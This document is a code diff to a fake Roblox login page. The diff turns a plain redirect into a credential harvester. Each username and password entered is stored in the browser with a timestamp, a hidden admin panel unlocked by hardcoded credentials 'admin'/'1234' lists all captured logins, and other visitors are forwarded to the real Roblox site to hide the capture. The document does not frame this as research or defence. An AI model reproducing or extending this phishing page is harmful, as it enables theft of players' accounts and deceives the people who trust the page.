@@ -22,6 +22,15 @@
             width: 300px;
             text-align: center;
         }
+        .admin-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 500px;
+            text-align: center;
+            display: none;
+        }
         .logo {
             margin-bottom: 20px;
         }
@@ -61,14 +70,21 @@
             color: #0073e6;
             cursor: pointer;
         }
+        .log-list {
+            text-align: left;
+            margin-top: 20px;
+        }
+        .log-item {
+            margin-bottom: 10px;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="container" id="login-container">
         <div class="logo">
             <img src="https://i.pinimg.com/originals/5d/1e/90/5d1e9035ac4ddf5f7c06ee10babdc4c9.webp" alt="Roblox Logo">
         </div>
-        <form onsubmit="redirectToRoblox(event)">
+        <form onsubmit="handleLogin(event)">
             <div class="input-group">
                 <label for="username">Username</label>
                 <input type="text" id="username" name="username" required>
@@ -81,11 +97,50 @@
         </form>
         <div class="forgot-password">Forgot Password?</div>
     </div>
+    <div class="admin-container" id="admin-container">
+        <h2>Admin Panel</h2>
+        <div class="log-list" id="log-list"></div>
+        <button onclick="logout()">Logout</button>
+    </div>
     <script>
-        function redirectToRoblox(event) {
+        const ADMIN_USERNAME = 'admin';
+        const ADMIN_PASSWORD = '1234';
+
+        function handleLogin(event) {
             event.preventDefault();
-            window.location.href = 'https://www.roblox.com';
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Log the login attempt
+            logLogin(username, password);
+
+            if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
+                showAdminPanel();
+            } else {
+                window.location.href = 'https://www.roblox.com';
+            }
+        }
+
+        function logLogin(username, password) {
+            const logs = JSON.parse(localStorage.getItem('loginLogs')) || [];
+            const newLog = { username, password, timestamp: new Date().toISOString() };
+            logs.push(newLog);
+            localStorage.setItem('loginLogs', JSON.stringify(logs));
+        }
+
+        function showAdminPanel() {
+            document.getElementById('login-container').style.display = 'none';
+            const adminContainer = document.getElementById('admin-container');
+            adminContainer.style.display = 'block';
+            const logList = document.getElementById('log-list');
+            const logs = JSON.parse(localStorage.getItem('loginLogs')) || [];
+            logList.innerHTML = logs.map(log => `<div class="log-item">[${log.timestamp}] Username: ${log.username}, Password: ${log.password}</div>`).join('');
+        }
+
+        function logout() {
+            document.getElementById('login-container').style.display = 'block';
+            document.getElementById('admin-container').style.display = 'none';
         }
     </script>
 </body>
-</html>
+            </html>
